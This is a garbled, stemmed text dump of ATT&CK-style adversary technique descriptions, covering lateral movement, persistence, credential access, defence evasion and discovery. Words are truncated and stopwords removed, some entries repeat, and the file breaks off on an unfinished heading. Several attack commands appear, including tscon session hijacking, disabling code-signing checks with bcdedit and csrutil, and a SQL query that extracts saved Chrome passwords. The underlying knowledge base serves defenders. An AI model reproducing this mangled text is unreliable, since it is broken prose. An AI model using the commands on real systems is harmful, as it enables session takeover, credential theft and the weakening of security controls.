advers us valid account http interact remot network shar us serv mess block smb advers perform act logged-on us smb fil print ser port shar protocol window machin network domain advers us smb interact fil shar allow mov lat throughout network linux maco impl smb typ us samb window system hid network shar access admin provid abl remot fil cop admin funct exampl network shar includ ` c ` ` admin ` ` ipc ` advers us techn conjunct administrator-level valid account http remot access network system smb wikiped serv mess block interact system us remot proc cal rpcs technet rpc transf fil run transf bin remot execut exampl execut techn rely auth sess smb/rpc schedule task/job http serv execut http window man instru http advers also us ntlm hash access admin shar system pas hash http certain config patch level microsoft admin shar
impl intern im
advers impl cloud contain im malicy cod est persist gain access environ amazon web serv aw amazon machin im am googl cloud platform gcp im az im wel popul contain runtim dock impl backdo unlik upload malw http techn foc advers impl im reg within victim ’ environ depend infrastruct provid could provid persist access infrastruct provid tool instruct alway us latest im rhino lab cloud im backdo techn sept 2019 tool develop facilit plant backdo cloud contain im rhino lab cloud backdo septemb 2019 advers access comprom aw inst permit list avail contain im impl backdo web shel http rhino lab cloud im backdo techn sept 2019
protocol tunnel
advers tunnel network commun victim system within sep protocol avoid detection/network filt and/or en access otherw unreach system tunnel involv explicit encaps protocol within anoth behavy cont malicy traff blend ex traff and/or provid out lay encrypt simil vpn tunnel could also en rout network packet would otherw reach intend destin smb rdp traff would filt network apply rout internet vary mean encaps protocol within anoth protocol exampl advers perform ssh tunnel also know ssh port forward involv forward arbit dat encrypt ssh tunnel ssh tunnel protocol tunnel http also abus advers dynam resolv http know dns http doh query resolv c2 infrastruct encaps within encrypt http packet bleepingcomp godlu jul19 advers also lev protocol tunnel http conjunct proxy http and/or protocol imperson http cont c2 commun infrastruct
control panel
advers abus control.exe proxy execut malicy payload window control panel process bin control.exe handl execut control panel item util allow us view adjust comput set control panel item reg execut .exe control panel .cpl fil lat act renam dynamic-link libr .dll fil export < cod > cplapplet < /code > funct microsoft impl cpl trendmicro cpl malw jan 2014 eas us control panel item typ includ graph menu avail us reg load control panel microsoft impl cpl control panel item execut direct command lin program via apply program interfac ap cal simply double-clicking fil microsoft impl cpl trendmicro cpl malw jan 2014 trendmicro cpl malw dec 2013 malicy control panel item del via phish http campaign trendmicro cpl malw jan 2014 trendmicro cpl malw dec 2013 execut part multi-stage malw palo alto reav nov 2017 control panel item spec cpl fil also bypass apply and/or fil extend allow list advers also renam malicy dll fil .dll control panel fil extend .cpl reg < cod > hkcu\software\microsoft\windows\currentversion\control panel\cpls < /code > ev reg dlls comply cpl fil spec export < cod > cplapplet < /code > funct load execut < cod > dllentrypoint < /code > control panel execut cpl fil export < cod > cplapplet < /code > direct execut eset invisimol jun 2020
network address transl travers
advers bridg network bound mod network dev ’ network address transl nat config malicy mod nat en advers bypass restrict traff rout otherw sep trust untrust network network dev rout firewal connect multipl network togeth impl nat process pass packet network perform nat network dev rewrit sourc and/or destin address ip address head network design requir nat packet cross bord dev typ exampl environ intern network mak us non-internet rout address rfc1918 advers gain control network bound dev eith lev ex nat config send traff two sep network impl nat config design cas network design requir nat funct en advers overcom inh rout limit would norm prev access protect system behind bord dev cas network design requir nat address transl us advers obsc act chang address packet travers network bound dev mak monit dat transmit challeng defend advers us patch system im http chang op system network dev impl custom nat mech obsc act
upload tool
advers upload tool third-party advers control infrastruct mak access target tool op clos sourc fre commerc tool us malicy purpos advers unlik malw intend us purpos ex psexec http advers upload tool support op mak tool avail victim network en ingr tool transf http plac internet access web serv tool plac infrastruct prevy purchased/rent advers acquir infrastruct http otherw comprom comprom infrastruct http del tg-3390 tool also stag web serv advers control github repo platform-as-a-service off en us easy provid apply drago heroku wat hol malwarebyt heroku skim intez ap serv phish advers avoid nee upload tool comprom victim machin download tool direct third-party host loc ex non-adversary control github repo includ origin host sit tool
sec support provid
advers abus sec support provid ssps execut dlls system boot window ssp dlls load loc sec auth lsa process system start load lsa ssp dlls access encrypt plaintext password stor window logged-on us domain password smart card pin ssp config stor two reg key < cod > hklm\system\currentcontrolset\control\lsa\security pack < /code > < cod > hklm\system\currentcontrolset\control\lsa\osconfig\security pack < /code > advers mod reg key ad new ssps load next tim system boot addsecuritypack window ap funct cal graeb 2014
winlogon help dll
winlogon.exe window compon respons act logon/logoff wel sec at sequ sa trig ctrl-alt-delete reg entry < cod > hklm\software\ wow6432node\ microsoft\windows nt\currentversion\winlogon\ < /code > < cod > hkcu\software\microsoft\windows nt\currentversion\winlogon\ < /code > us man addit help program funct support winlogon cyl reg persist sept 2013 malicy mod reg key caus winlogon load execut malicy dlls and/or execut spec follow subkey know poss vuln abus cyl reg persist sept 2013 winlogon\notify - point not pack dlls handl winlogon ev winlogon\userinit - point userinit.exe us init program execut us log winlogon\shell - point explorer.exe system shel execut us log advers tak adv feat rep execut malicy cod est persist
bin pad
advers us bin pad ad junk dat chang on-disk repres malw without affect funct behavy bin oft increas siz bin beyond sec tool cap handl due fil siz limit bin pad effect chang checks fil also us avoid hash-based blackl stat anti-virus sign eset oceanlot pad us common gen funct cre junk dat append end apply sect malw securel malw trick april 2017 increas fil siz decreas effect certain tool detect cap design config scan larg fil also reduc lik collect analys publ fil scan serv virustot limit maxim siz upload fil analys virustot faq
us altern auth mat
advers us altern auth mat password hash kerbero ticket apply access tok ord mov lat within environ bypass norm system access control auth process gen requir valid id usernam along on auth fact password pin phys smart card tok gen etc. altern auth mat legitim gen system us apply success auth provid valid id requir auth fact altern auth mat also gen id cre process nist auth nist mfa cach altern auth mat allow system ver id success auth without ask us reent auth fact altern auth must maintain system—either mem disk—it risk ste cred access http techn ste altern auth mat advers abl bypass system access control auth system without know plaintext password addit auth fact
remot desktop protocol
remot desktop common feat op system allow us log interact sess system desktop graph us interfac remot system microsoft ref impl remot desktop protocol rdp remot desktop serv rds technet remot desktop serv impl third-party tool provid graph access remot serv http simil rds advers connect remot system rdp/rds expand access serv en allow access account know cred advers lik us cred access techn acquir cred us rdp advers also us rdp conjunct access feat http techn persist alperovitch malw advers also perform rdp sess hijack involv ste legitim us remot sess typ us not someon els try ste sess prompt quest system permit us termin serv consol < cod > c \windows\system32\tscon.exe sess numb ste < /code > advers hijack sess without nee cred prompt us rdp hijack korznikov do remot loc act disconnect sess rdp hijack med also lead remot system discovery http privileg esc ste domain admin high privileg account sess do us nat window command also ad feat redsnarf kal redsnarf
threat intel vend
advers search priv dat threat intellig vend inform us target threat intellig vend off pay fee port off dat publ report although sensit detail custom nam ident redact inform contain trend regard breach target industry attribut claim success ttps/countermeasures d3secutrity cti fee advers search priv threat intellig vend dat gath act inform threat act seek information/indicators gath campaign wel conduc advers align target industry capabilities/objective op concern inform report vend also rev opportun form reconnaiss ex search op websites/domain http est op resourc ex develop cap http obtain cap http and/or init access ex exploit public-facing apply http extern remot serv http
exfilt network med
advers attempt exfilt dat diff network med command control channel command control network wir internet connect exfilt occ exampl wif connect modem cellul dat connect bluetoo anoth radio frequ rf channel advers choos sufficy access proxim connect might sec defend wel prim internet-connected channel rout enterpr network
network dev config dump
advers access network config fil collect sensit dat dev network network config fil contain paramet determin op dev dev typ stor in-memory cop config op sep config non-volatile stor load dev reset advers inspect config fil rev inform target network layout network dev softw ident legitim account cred lat us advers us common man tool protocol simpl network man protocol snmp smart instal smi access network config fil us-cert ta18-106 network infrastruct dev 2018 cisco blog leg dev attack tool us query spec dat config reposit config dev export config lat analys
gath victim id inform
advers gath inform victim id us target inform id includ vary detail includ person dat ex employ nam email address etc wel sensit detail cred advers gath inform vary way direct elicit via phish inform http inform us could also enum via act mean i.e act scan http prob analys respons auth serv rev valid usernam system grimblog usernameen inform victim also expos advers via onlin access dat set ex soc med http search victim-owned websit http opm leak reg deloit reg ub detect slack tok forb github cred github trufflehog github gitrob cnet leak gath inform rev opportun form reconnaiss ex search op websites/domain http phish inform http est op resourc ex comprom account http and/or init access ex phish http valid account http
auth pack
window auth pack dlls load loc sec auth lsa process system start provid support multipl logon process multipl sec protocol op system msdn auth pack advers us autostart mech provid lsa auth pack persist plac ref bin window reg loc < cod > hklm\system\currentcontrolset\control\lsa\ < /code > key valu < cod > auth pack = < target bin > < /code > bin execut system auth pack load
extr window mem inject
cre window graph windows-based process must prescrib reg window class stip appear behavy via window proc funct handl input/output dat microsoft window class reg new window class includ request 40 byt extr window mem ewm append alloc mem inst class ewm intend stor dat spec window spec apply program interfac ap funct set get valu microsoft getwindowlong funct microsoft setwindowlong funct although smal ewm larg enough stor 32-bit point oft us point window proc malw poss util mem loc part attack chain includ writ cod shar sect process ’ mem plac point cod ewm invok execut return execut control address process ’ ewm execut grant ewm inject tak plac address spac sep liv process simil process inject http allow access target process mem poss elev privileg writ payload shar sect also avoid us high monit ap cal writeprocessmem createremotethread elast process inject july 2017 soph malw sampl also pot bypass protect mech dat execut prev dep trig combin window proc system funct rewrit malicy payload insid execut port target process malwaretech pow load aug 2013 welivesec gapz redym mar 2013
dis mod system firewal
advers dis mod system firewal ord bypass control limit network us chang could dis entir mech wel ad delet mod particul rul do num way depend op system includ via command-line edit window reg key window control panel mod dis system firewal en advers c2 commun lat mov and/or dat exfilt would otherw allow
arch collect dat
advers compress and/or encrypt dat collect pri exfilt compress dat help obfusc collect dat minim amount dat send network encrypt us hid inform exfilt detect mak exfilt le conspicu upon inspect defend compress encrypt do pri exfilt perform us util 3rd party libr custom method
launchctl
launchctl control maco launchd process handl thing lik launch ag launch daemon execut command program launchctl support tak subcommand command-line interact ev redirect standard input load reload launch ag launch daemon advers instal persist execut chang mak sof komplex trod run command launchctl simpl < cod > launchctl submit -l < labelnam > -- /path/to/thing/to/execute arg arg arg < /code > load unload reload launch ag launch daemon requir elev privileg advers abus funct execut cod ev bypass whitel launchctl allow process
sip trust provid hijack
advers tamp sip trust provid compon mislead op system apply control tool conduc sign valid check us mod window authenticod microsoft authenticod digit sign us ver fil origin integr vary us est trust sign cod ex driv valid microsoft sign handl saf sign valid process handl via winverifytrust apply program interfac ap funct microsoft winverifytrust acceiv inquiry coordin appropry trust provid respons valid paramet sign spectorop subvert trust sept 2017 vary execut fil typ correspond sign form microsoft cre softw compon cal subject interfac pack sip eduardosblog sip july 2008 provid lay abstract ap funct fil sip respons en ap funct cre retriev calc ver sign un sip ex fil form execut powershel instal etc. catalog sign provid catch-all microsoft catalog fil sign april 2017 ident glob un ident guid spectorop subvert trust sept 2017 simil cod sign http advers abus architect subvert trust control bypass sec policy allow legitim sign cod execut system advers hijack sip trust provid compon mislead op system apply control tool class malicy cod sign spectorop subvert trust sept 2017 mod < cod > dll < /code > < cod > funcnam < /code > reg valu < cod > hklm\software \wow6432node\ microsoft\cryptography\oid\encodingtype 0\cryptsipdllgetsigneddatamsg\ sip_guid < /code > point dynam link libr dll provid sip ’ cryptsipdllgetsigneddatamsg funct retriev encod digit cert sign fil point maliciously-crafted dll export funct alway return know good sign valu ex microsoft sign port execut rath fil ’ real sign advers apply acceiv sign valu fil us sip github sip poc sept 2017 although hash mismatch lik occ invalid sign sint hash return funct match valu comput fil mod < cod > dll < /code > < cod > funcnam < /code > reg valu < cod > hklm\software\ wow6432node\ microsoft\cryptography\oid\encodingtype 0\cryptsipdllverifyindirectdata\ sip_guid < /code > point dll provid sip ’ cryptsipdllverifyindirectdat funct valid fil ’ comput hash sign hash valu point maliciously-crafted dll export funct alway return tru ind valid success advers success valid fil legitim sign us sip github sip poc sept 2017 without hijack prevy ment cryptsipdllgetsigneddatamsg funct reg valu could also redirect suit export funct already pres dll avoid requir drop execut new fil disk mod < cod > dll < /code > < cod > funct < /code > reg valu < cod > hklm\software\ wow6432node\ microsoft\cryptography\providers\trust\finalpolicy\ trust provid guid < /code > point dll provid trust provid ’ finalpolicy funct decod pars sign check maj trust decid mak simil hijack sip ’ cryptsipdllverifyindirectdat funct valu redirect suit export funct already pres dll maliciously-crafted dll though impl trust provid complex not hijack also poss without mod reg via dll search ord hijack http hijack sip trust provid compon also en persist cod execut sint malicy compon invok apply perform cod sign sign valid spectorop subvert trust sept 2017
domain gen algorithm
advers mak us domain gen algorithm dga dynam ident destin command control traff rath rely list stat ip address domain adv mak much hard defend block track tak command control channel pot could thousand domain malw check instruct cybereason dissect dga cisco umbrell dga unit 42 dga feb 2019 dga tak form app random “ gib ” string ex istgmxdejdnxuyla.ru construct domain nam gen let altern dga employ whol word unit cont word togeth instead let ex cityjulydish.net many dga time-based gen diff domain tim period hour dai month etc oth incorp see valu wel mak predict fut domain difficult defend cybereason dissect dga cisco umbrell dga talo ccleanup 2017 akama dga mitig advers us dga purpos fallback channel http contact los prim command control serv malw employ dga mean reest command control talo ccleanup 2017 fireey poshspy april 2017 eset sednit 2017 act
brows sess hijack
advers tak adv sec vuln inh funct brows softw chang cont mod user-behaviors interceiv inform part vary brows sess hijack techn wikiped man brows spec exampl advers inject softw brows allow inherit cooky http sess ssl cli cert us us brows way pivot auth intranet cobalt strike brows pivot icebrg chrome extend execut browser-based behavy pivot requir spec process permit < cod > sedebugprivileg < /code > and/or high-integrity/administrator right anoth exampl involv pivot brows traff advers brows us brows set proxy redirect web traff alt us traff way proxy connect sev soon brows clos advers assum sec context whichev brows process proxy inject brows typ cre new process tab op permit cert sep accord permit advers could pot brows resourc intranet sharepoint http webmail access brows brows sufficy permit brows pivot also bypass sec provid 2-factor auth cobaltstrik man
remot serv
advers us valid account http log serv spec design acceiv remot connect telnet ssh vnc advers perform act logged-on us enterpr environ serv workst org domain domain provid cent id man allow us login us on set cred across entir network advers abl obtain set valid domain cred could login many diff machin us remot access protocol sec shel ssh remot desktop protocol rdp ssh sec shel technet remot desktop serv legitim apply softw deploy tool http admin program util remot serv http access remot host exampl appl remot desktop ard maco nat softw us remot man ard lev blend protocol includ vnc http send screen control buff ssh http sec fil transf remot man mdm maco kickstart appl remot desktop command appl remot desktop admin guid 3.3 advers abus apply ard gain remot cod execut perform lat mov vert maco pri 10.14 advers esc ssh sess ard sess en advers acceiv tcc transp cons control prompt without us interact gain access dat fireey 2019 appl remot desktop lockboxx ard 2019 kickstart appl remot desktop command
mail protocol
advers commun us apply lay protocol assocy electron mail delivery avoid detection/network filt blend ex traff command remot system oft result command emb within protocol traff cli serv protocol smtp/s pop3/s imap carry electron mail common environ packet produc protocol many field head dat cont dat could also cont within email mess advers abus protocol commun system control within victim network also mim norm expect traff
hybrid id
advers patch mod otherw backdo cloud auth process tie on-premises us id ord bypass typ auth mech access cred en persist access account many org maintain hybrid us dev id shar on-premises cloud-bas environ maintain numb way exampl az ad includ three opt synchron id act direct az ad az ad hybrid id password hash synchron ph privileg on-premises account synchron us password hash act direct az ad allow auth az ad tak plac entir cloud pas auth pta az ad auth attempt forward on-premises pta ag valid cred act direct act direct fed serv ad f trust rel est act direct az ad ad f also us saa cloud platform aw gcp hand auth process ad f receiv tok contain hybrid us ’ id privileg mod auth process tie hybrid id advers abl est persist privileg access cloud resourc exampl advers comprom on-premises serv run pta ag inject malicy dll ` azureadconnectauthenticationagentserv ` process auth attempt auth az ad wel record us cred az ad connect read team aadintern az ad on-prem cloud environ us ad f advers edit ` microsoft.identityserver.servicehost ` config fil load malicy dll gen auth tok us set claim thereby bypass multi-factor auth defin ad f policy magicweb cas advers abl mod hybrid id auth process cloud exampl advers comprom glob admin account az ad ten abl reg new pta ag via web consol simil allow harvest cred log az ad environ us mandy az ad backdo
vuln scan
advers scan victim vuln us target vuln scan typ check config target host/application ex softw vert pot align target spec exploit advers seek us scan also includ broad attempt gath victim host inform http us ident common know exploit vuln vuln scan typ harvest run softw vert numb via serv ban list port network artifact owasp vuln scan inform scan rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex exploit public-facing apply http
search op techn databas
advers search fre avail techn databas inform victim us target inform victim avail onlin databas reposit reg domains/certificate wel publ collect network data/artifacts gath traff and/or scan who dns dumpst circ pass dns med ssl cert sslshopper lookup digitalshadow cdn shod advers search diff op databas depend inform seek gath inform sourc rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex extern remot serv http trust rel http
rog domain control
advers reg rog domain control en manip act direct dat dcshadow us cre rog domain control dc dcshadow method manip act direct ad dat includ object schema reg reus inact reg sim behavy dc dcshadow blog reg rog dc abl inject reply chang ad infrastruct domain object includ cred key reg rog dc involv cre new serv ntdsdsa object config partit ad schema requir admin privileg eith domain loc dc krbtgt hash adsec mimikatz guid techn bypass system log sec monit sec inform ev man siem produc sint act tak rog dc report sens dcshadow blog techn also us alt delet reply assocy metadat obstruct forens analys advers also util techn perform sid-history inject http and/or manip ad object account access control list schema est backdo persist dcshadow blog
cod sign policy mod
advers mod cod sign policy en execut unsign self-signed cod cod sign provid level auth program develop guar program tamp sec control includ enforc mech ens valid sign cod run op system sec control en default driv sign enforc dse window system integr protect sip maco microsoft dse jun 2017 appl dis sip control dis default config apply control allow sign dynamic-link libr dlls execut system sint us develop mod default sign enforc policy develop test apply dis feat poss elev permit microsoft unsign driv apr 2017 appl dis sip advers mod cod sign policy numb way includ us command-line gui util mod reg http reboot comput debug/recovery mod alt valu vary kernel mem microsoft testsign feb 2021 appl dis sip fireey hikit rootkit part 2 github turl driv load exampl command mod cod sign policy system includ < cod > bcdedit.exe -set testsign < /code > window < cod > csrutil dis < /code > maco microsoft testsign feb 2021 appl dis sip depend impl success mod sign policy requir reboot comprom system addit impl introduc vis artifact us ex watermark corn screen stat system test mod advers attempt remov artifact f-secure blackenergy 2014 gain access kernel mem mod vary rel sign check mod < cod > g_cioptions < /code > dis driv sign enforc advers conduc exploit privileg esc http us sign vuln driv unit42 acidbox jun 2020 github turl driv load
deploy contain
advers deploy contain environ facilit execut evad defens cas advers deploy new contain execut process assocy particul im deploy process execut download malw oth advers deploy new contain config without network rul us limit etc bypass ex defens within environ contain deploy vary mean via dock < cod > cre < /code > < cod > start < /code > ap via web apply kubernet dashboard kubeflow dock contain ap kubernet dashboard kubeflow pipelin advers deploy contain bas retriev build malicy im benign im download execut malicy payload runtim aqu build im host
fil delet
advers delet fil leav behind act intrud act malw tool non-native fil drop cre system advers leav trac ind do within network remov fil occ intrud part post-intrusion process minim advers footprint tool avail host op system perform cleanup advers us tool wel exampl includ nat cmd http funct del sec delet tool window sysintern sdelet third-party fil delet tool trend micro apt attack tool
priv key
priv cryptograph key cert us auth encryption/decrypt digit sign wikiped publ key crypto advers gath priv key comprom system us auth remot serv http lik ssh us decrypt collect fil email common key cert fil extend includ .key .pgp .gpg .ppk. .p12 .pem .pfx .cer .p7b .asc advers also look common key direct < cod > ~/.ssh < /code > ssh key nix-based system < cod > c \users\ usernam \.ssh\ < /code > window priv key requir password passphras op advers also us input capt http keylog attempt brut forc http passphras off-line advers tool discov search comprom system fil extend rel cryptograph key cert kaspersky careto palo alto print pers
mod reg
advers interact window reg hid config inform within reg key remov inform part cle part techn aid persist execut access spec are reg depend account permit requir administrator-level access built-in window command-line util reg http us loc remot reg mod microsoft reg tool also us remot access tool contain funct interact reg window ap reg mod also includ act hid key prepend key nam nul charact caus er and/or ign read via reg http util us win32 ap microsoft reghid nov 2006 advers abus pseudo-hidden key cont payloads/command us maintain persist trendmicro powelik aug 2014 spectorop hid reg jul 2017 reg remot system mod aid execut fil part lat mov requir remot reg serv run target system microsoft remot oft valid account http requir along access remot system smb/windows admin shar http rpc commun
launch daemon
advers cre mod launch daemon execut malicy payload part persist launch daemon plist fil us interact launchd serv man framework us maco launch daemon requir elev privileg instal execut every us system pri login run background without nee us interact maco init startup launchd process load paramet launch-on-demand system-level daemon plist fil find < cod > /system/library/launchdaemons/ < /code > < cod > /library/launchdaemons/ < /code > requir launch daemon paramet includ < cod > label < /code > ident task < cod > program < /code > provid path execut < cod > runatload < /code > spec task run launch daemon oft us provid access shar resourc upd softw conduc autom task appledoc launch ag daemon method mac malw persist launchd keyword plist advers instal launch daemon config execut startup us < cod > runatload < /code > paramet set < cod > tru < /code > < cod > program < /code > paramet set malicy execut path daemon nam disgu us nam rel op system benign softw i.e masquerad http launch daemon execut program inherit admin permit wirelurk osx malw detect addit system config chang instal third party pack man softw caus fold < cod > usr/local/bin < /code > becom glob writ poss poor config allow advers mod execut ref cur launch daemon plist fil launchdaemon hijack sentinelon maco persist jun 2019
cloud infrastruct discovery
advers attempt discov infrastruct resourc avail within infrastructure-as-a-servic ia environ includ comput serv resourc inst virt machin snapshot wel resourc serv includ stor databas serv cloud provid off method ap command issu cli serv inform infrastruct exampl aw provid < cod > describeinst < /code > ap within amazon ec2 ap return inform on inst within account < cod > listbucket < /code > ap return list bucket own auth send request < cod > headbucket < /code > ap determin bucket ’ ex along access permit request send < cod > getpublicaccessblock < /code > ap retriev access block config bucket amazon describ inst amazon describ inst ap aw get publ access block aw head bucket simil gcp cloud sdk cli provid < cod > gcloud comput inst list < /code > command list googl comput engin inst project googl comput inst az cli command < cod > az vm list < /code > list detail virt machin microsoft az cli addit ap command advers util op sourc tool discov cloud stor infrastruct wordl scan http malwarebyt osint leaky bucket - hiourea advers enum resourc us comprom us access key determin avail us expel io evil aw discovery avail resourc help advers determin next step cloud environ est persist mandy m-trends 2020 advers also us inform chang config mak bucket publ access allow dat access without auth advers also us infrastruct discovery ap < cod > describedbinst < /code > determin siz own permit network ac databas resourc aw describ db inst advers us inform determin pot valu databas discov requir access unlik cloud serv discovery http techn foc discovery compon provid serv rath serv
cred web brows
advers acquir cred web brows read fil spec target brows talo olymp destroy 2018 web brows common sav cred websit usernam password nee ent man fut web brows typ stor cred encrypt form within cred stor howev method ex extract plaintext cred web brows exampl window system encrypt cred obtain googl chrome read databas fil < cod > appdata\local\google\chrome\user data\default\login dat < /code > execut sql query < cod > select action_url username_valu password_value login < /code > plaintext password obtain pass encrypt cred window ap funct < cod > cryptunprotectdat < /code > us victim ’ cach logon cred decrypt key microsoft cryptunprotectdat april 2018 advers execut simil proc common web brows firefox safar edg etc proofpoint veg cred ste 2018 fireey hawkey malw july 2017 window stor internet expl microsoft edg cred cred lock man window cred man http advers also acquir cred search web brows process mem pattern common match cred github mimikittenz july 2016 acquir cred web brows advers attempt recyc cred across diff system and/or account ord expand access result sign furth advers object cas cred gain web brows overlap privileg account e.g domain admin
path interceiv search ord hijack
advers execut malicy payload hijack search ord us load program program cal program us ful path advers plac fil direct cal program loc caus op system launch malicy softw request cal program search ord hijack occ advers abus ord window search program giv path unlik dll search ord hijack http search ord diff depend method us execut program microsoft createprocess window nt command shel microsoft winexec howev common window search direct in program search window system direct advers find program vuln search ord hijack i.e. program spec path execut tak adv vuln cre program nam improp spec program plac within in program direct exampl example.ex run cmd.exe command-line argu < cod > net us < /code > advers plac program cal net.exe within direct example.ex net.exe run instead window system util net addit advers plac program cal net.com direct net.exe < cod > cmd.exe /c net us < /code > execut net.com instead net.exe due ord execut extend defin pathext microsoft environ property search ord hijack also common pract hijack dll load cov dll search ord hijack http
defac
advers mod vis cont avail intern extern enterpr network thu affect integr origin cont reason defac http includ del mess intimid claim poss fals credit intrud disturb offend im us part defac http ord caus us discomfort press comply accompany mess
unused/unsupport cloud reg
advers cre cloud inst unus geograph serv reg ord evad detect access us obtain comprom account us man cloud infrastruct cloud serv provid oft provid infrastruct throughout world ord improv perform provid redund allow custom meet comply requir oftentim custom us subset avail reg act monit reg advers cre resourc unus reg abl op undetect vary behavy tak adv diff funct across cloud reg advers could util reg support adv detect serv ord avoid detect act exampl advers us unus aw reg min cryptocur resourc hijack http cost org subst amount money tim depend process pow us cloudsploit - unus aw reg
dhcp spoof
advers redirect network traff adversary-owned system spoof dynam host config protocol dhcp traff act malicy dhcp serv victim network achiev adversary-in-the-middle aitm posit advers collect network commun includ pass cred espec send insec unencrypt protocol also en follow-on behavy network sniff http transmit dat manip http dhcp bas client-server model two funct protocol provid network config set dhcp serv cli mech alloc network address cli rfc2131 typ server-client interact follow 1. cli broadcast ` discov ` mess 2. serv respond ` off ` mess includ avail network address 3. cli broadcast ` request ` mess includ network address off 4. serv acknowledg ` ack ` mess cli receiv network config paramet advers spoof rog dhcp serv victim network legitim host receiv malicy network config exampl malw act dhcp serv provid adversary-owned dns serv victim comput new_rogue_dhcp_serv_malware w32.tidserv.g malicy network config advers achiev aitm posit rout cli traff adversary-controlled system collect inform cli network dhcpv6 cli receiv network config inform without assign ip address send < cod > information-request cod 11 < /code > mess < cod > all_dhcp_relay_agents_and_servers < /code > multicast address rfc3315 advers us rog dhcp serv respond request mess malicy network config rath est aitm posit advers also abus dhcp spoof perform dhcp exhaust attack i.e serv exhaust flood http gen many broadcast discov mess exhaust network ’ dhcp alloc pool
applescrib
maco o x apply send appleev mess interprocess commun ipc mess easy script applescrib loc remot ipc osascrib execut applescrib op script architect os langu script list os langu inst system find us < cod > osalang < /code > program appleev mess send independ part script ev loc op window send keystrok interact almost op apply loc remot advers us interact op ssh connect mov remot machin ev pres us fak dialog box ev start apply remot start loc though interact apply 're already run remot sint script langu us launch common techn wel revers shel via python macro malw target mac script run command-line via < cod > osascrib /path/to/script < /code > < cod > osascrib -e script < /code >
remot serv sess hijack
advers tak control preex sess remot serv mov lat environ us us valid cred log serv spec design acceiv remot connect telnet ssh rdp us log serv sess est allow maintain continu interact serv advers command sess carry act remot system remot serv sess hijack http diff us remot serv http hijack ex sess rath cre new sess us valid account http rdp hijack med breach post-mortem ssh hijack
bin pad
advers us bin pad ad junk dat chang on-disk repres malw do without affect funct behavy bin increas siz bin beyond sec tool cap handl due fil siz limit bin pad effect chang checks fil also us avoid hash-based blockl stat anti-virus sign eset oceanlot pad us common gen funct cre junk dat append end apply sect malw securel malw trick april 2017 increas fil siz decreas effect certain tool detect cap design config scan larg fil also reduc lik collect analys publ fil scan serv virustot limit maxim siz upload fil analys virustot faq
web shel
advers backdo web serv web shel est persist access system web shel web script plac op access web serv allow advers us web serv gateway network web shel provid set funct execut command-line interfac system host web serv volexity_0day_sophos_fw addit server-side script web shel cli interfac program us talk web serv e.g chin chop http web shel cli lee 2013
group policy mod
advers mod group policy object gpo subvert intend discret access control domain us int esc privileg domain group policy allow cent man us comput set act direct ad gpo contain group policy set mak fil stor within pred network path < cod > \\ lt domain gt \sysvol\ lt domain gt \policies\ < /code > technet group policy bas adsec gpo persist 2016 lik object ad gpo access control assocy default us account domain permit read gpo poss deleg gpo access control permit e.g writ access spec us group domain malicy gpo mod us impl many malicy behavy schedule task/job http dis mod tool http ingr tool transf http cre account http serv execut http adsec gpo persist 2016 wald0 guid gpo harmj0y abus gpo permit mandy trend 2016 microsoft hack team breach sint gpo control many us machin set ad environ gre numb pot attack stem gpo abus wald0 guid gpo exampl publ avail script < cod > new-gpoimmediatetask < /code > lev autom cre malicy schedule task/job http mod gpo set cas mod < cod > lt gpo_path gt \machine\preferences\scheduledtasks\scheduledtasks.xml < /code > wald0 guid gpo harmj0y abus gpo permit cas advers might mod spec us right lik seenabledelegationprivileg set < cod > lt gpo_path gt \machine\microsoft\windows nt\secedit\gpttmpl.inf < /code > achiev subtl ad backdo complet control domain us account advers control would abl mod gpo harmj0y seenabledelegationprivileg right
brows bookmark discovery
advers enum brows bookmark learn comprom host brows bookmark rev person inform us ex bank sit interest soc med etc wel detail intern network resourc serv tools/dashboard rel infrastruct brows bookmark also highlight addit target advers access valid cred espec cred fil http assocy login cach brows spec stor loc vary bas platform and/or apply brows bookmark typ stor loc files/database
priv key
advers search priv key cert fil comprom system insec stor cred priv cryptograph key cert us auth encryption/decrypt digit sign wikiped publ key crypto common key cert fil extend includ .key .pgp .gpg .ppk. .p12 .pem .pfx .cer .p7b .asc advers also look common key direct < cod > ~/.ssh < /code > ssh key nix-based system < cod > c 92 us 92 usernam 92 .ssh 92 < /code > window priv key us auth remot serv http lik ssh us decrypt collect fil email advers tool discov search comprom system fil extend rel cryptograph key cert kaspersky careto palo alto print pers priv key requir password passphras op advers also us input capt http keylog attempt brut forc http passphras off-line
serv
advers buy leas rent phys serv us target us serv allow advers stag launch execut op post-compromise act advers util serv vary task includ command control instead comprom third-party serv http rent virt priv serv http advers opt config run serv support op advers nee lightweight setup act tak plac us onlin infrastruct nee build extend infrastruct want test commun control aspect act system nytstuxnet
window remot man
advers us valid account http interact remot system us window remot man winrm advers perform act logged-on us winrm nam window serv protocol allow us interact remot system run execut mod reg mod serv microsoft winrm cal ` winrm ` command numb program powershel jacobs 2014 winrm us method remot interact window man instru http msdn wmi
exfilt bluetoo
advers attempt exfilt dat bluetoo rath command control channel command control network wir internet connect advers opt exfilt dat us bluetoo commun channel advers choos sufficy access proxim bluetoo connect might sec defend wel prim internet-connected channel rout enterpr network
default account
advers obtain abus cred default account mean gain init access persist privileg esc defens evas default account built-into o guest admin account window system default account also includ default factory/provider set account typ system softw dev includ root us account aw default serv account kubernet microsoft loc account feb 2019 aw root us threat matrix kubernet default account limit cli machin rath also includ account preset equip network dev comput apply wheth intern op sourc commerc apply com preset usernam password combin pos sery threat org chang post instal easy target advers simil advers also util publ disclos ste priv key http cred mat legitim connect remot environ via remot serv http metasploit ssh mod
tim provid
advers abus tim provid execut dlls system boot window tim serv w32time en tim synchron across within domain microsoft w32time feb 2018 w32time tim provid respons retriev tim stamp hardware/network resourc output valu network cli microsoft timeprovid tim provid impl dynamic-link libr dlls reg subkey < cod > hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ < /code > microsoft timeprovid tim provid man direct serv control man load start tim provid list en key system startup and/or whenev paramet chang microsoft timeprovid advers abus architect est persist spec reg en malicy dll tim provid admin privileg requir tim provid reg though execut run context loc serv account github w32time oct 2017
im fil execut opt inject
